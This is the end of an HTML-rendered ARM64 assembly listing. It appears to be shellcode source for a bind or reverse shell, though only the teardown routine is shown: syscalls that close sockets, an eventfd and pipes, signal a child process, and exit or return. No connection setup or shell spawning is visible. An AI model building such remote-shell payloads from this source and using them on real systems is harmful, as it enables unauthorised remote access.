    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// close(efd);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">efd</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// shutdown(s, SHUT_RDWR);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_shutdown</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">SHUT_RDWR</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
<span class="Identifier">cls_sck:</span>
    <span class="Comment">// close(s);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

<span class="PreProc">.ifdef</span> <span class="Identifier">BIND</span>
    <span class="Comment">// close(s2);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">s2</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
<span class="PreProc">.endif</span>
    <span class="Comment">// kill(pid, SIGCHLD);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_kill</span>
    <span class="Statement">mov</span>     <span class="Type">x1</span><span class="Statement">,</span> <span class="Identifier">SIGCHLD</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">id</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// close(in[1]);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">in1</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

    <span class="Comment">// close(out[0]);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_close</span>
    <span class="Statement">ldr</span>     <span class="Type">w0</span><span class="Statement">,</span> [<span class="Type">sp</span><span class="Statement">,</span> <span class="Identifier">out0</span>]
    <span class="Identifier">svc</span>     <span class="Constant">0</span>

<span class="PreProc">.ifdef</span> <span class="Identifier">EXIT</span>
    <span class="Comment">// exit(0);</span>
    <span class="Statement">mov</span>     <span class="Type">x8</span><span class="Statement">,</span> <span class="Identifier">SYS_exit</span>
    <span class="Identifier">svc</span>     <span class="Constant">0</span>
<span class="PreProc">.else</span>
    <span class="Comment">// deallocate stack</span>
    <span class="Statement">add</span>     <span class="Type">sp</span><span class="Statement">,</span> <span class="Type">sp</span><span class="Statement">,</span> (<span class="Identifier">ds_tbl_size</span> <span class="Statement">&amp;</span> <span class="Statement">-</span><span class="Constant">16</span>) <span class="Statement">+</span> <span class="Constant">16</span>
    <span class="Statement">ret</span>
<span class="PreProc">.endif</span>
</pre>
</body>
</html>
<!-- vim: set foldmethod=manual : -->
